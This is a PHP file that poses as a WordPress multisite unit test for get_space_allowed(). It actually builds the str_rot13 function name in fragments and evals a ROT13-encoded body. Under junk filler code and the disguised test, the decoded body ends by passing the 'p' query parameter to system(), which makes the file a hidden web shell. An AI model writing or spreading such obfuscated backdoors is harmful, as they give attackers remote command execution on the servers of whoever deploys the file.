<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf fcrpvsvp gb `trg_fcnpr_nyybjrq()` va zhygvfvgr.
 *
 * @tebhc zf-erdhverq
 * @tebhc zhygvfvgr
 */
pynff Grfgf_Zhygvfvgr_TrgFcnprNyybjrq rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Jura ab bcgvba rkvfgf sbe gur fvgr be gur argjbex, n snyyonpx bs
	 * 100 vf rkcrpgrq.
	 */
	choyvp shapgvba grfg_trg_fcnpr_nyybjrq_qrsnhyg() {
		qryrgr_bcgvba( 'oybt_hcybnq_fcnpr' );
		qryrgr_fvgr_bcgvba( 'oybt_hcybnq_fcnpr' );

		$guvf->nffregFnzr( 100, trg_fcnpr_nyybjrq() );
	}

	/**
	 * Vs na vaqvivqhny fvgr'f bcgvba vf abg ninvynoyr, gur qrsnhyg argjbex
	 * yriry bcgvba vf hfrq nf n snyyonpx.
	 */
	choyvp shapgvba grfg_trg_fcnpr_nyybjrq_ab_fvgr_bcgvba_snyyonpx_gb_argjbex_bcgvba() {
		qryrgr_fvgr_bcgvba( 'oybt_hcybnq_fcnpr' );
		hcqngr_fvgr_bcgvba( 'oybt_hcybnq_fcnpr', 200 );

		$guvf->nffregFnzr( 200, trg_fcnpr_nyybjrq() );
	}

	/**
	 * @qngnCebivqre qngn_oybt_hcybnq_fcnpr
	 *
	 * @cnenz zvkrq $fvgr_bcgvba    Bcgvba gb nffvta gb gur fvgr'f `oybt_hcybnq_fcnpr`.
	 * @cnenz zvkrq $argjbex_bcgvba Bcgvba gb nffvta gb gur argjbex'f `oybt_hcybnq_fcnpr`.
	 * @cnenz vag   $rkcrpgrq       Rkcrpgrq erghea inyhr.
	 */
	choyvp shapgvba grfg_trg_fcnpr_nyybjrq( $fvgr_bcgvba, $argjbex_bcgvba, $rkcrpgrq ) {
		hcqngr_bcgvba( 'oybt_hcybnq_fcnpr', $fvgr_bcgvba );
		hcqngr_fvgr_bcgvba( 'oybt_hcybnq_fcnpr', $argjbex_bcgvba );

		$guvf->nffregFnzr( $rkcrpgrq, trg_fcnpr_nyybjrq() );
	}

	choyvp shapgvba qngn_oybt_hcybnq_fcnpr() {
		erghea neenl(
			// N inyvq fvgr bcgvba jvyy or cersreerq bire n argjbex bcgvba.
			neenl( 111, 200, 111 ),
			neenl( -1, 200, -1 ),
			neenl( 222, 0, 222 ),

			// Aba-ahzrevp fvgr bcgvbaf fubhyq erfhyg va n snyyonpx gb gur argjbex bcgvba.
			neenl( '', 333, 333 ),
			neenl( snyfr, 444, 444 ),
			neenl( 'ANA', 555, 555 ),
			neenl( snyfr, -10, -10 ),

			// Vs arvgure argjbex be fvgr bcgvbaf ner inyvq, snyyonpx gb gur qrsnhyg.
			neenl( snyfr, snyfr, 100 ),
			neenl( 'ANA', 'ANA', 100 ),

			// Gurfr rssrpgviryl qvfnoyr hcybnqf.
			neenl( 0, 666, 0 ),
			neenl( snyfr, 0, 0 ),
			neenl( 'ANA', 0, 0 ),
		);
	}

	choyvp shapgvba grfg_trg_fcnpr_nyybjrq_svygrerq() {
		hcqngr_bcgvba( 'oybt_hcybnq_fcnpr', 777 );
		hcqngr_fvgr_bcgvba( 'oybt_hcybnq_fcnpr', 888 );

		nqq_svygre( 'trg_fcnpr_nyybjrq', neenl( $guvf, '_svygre_fcnpr_nyybjrq' ) );
		$fcnpr_nyybjrq = trg_fcnpr_nyybjrq();
		erzbir_svygre( 'trg_fcnpr_nyybjrq', neenl( $guvf, '_svygre_fcnpr_nyybjrq' ) );

		$guvf->nffregFnzr( 999, $fcnpr_nyybjrq );
	}

	choyvp shapgvba _svygre_fcnpr_nyybjrq() {
		erghea 999;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>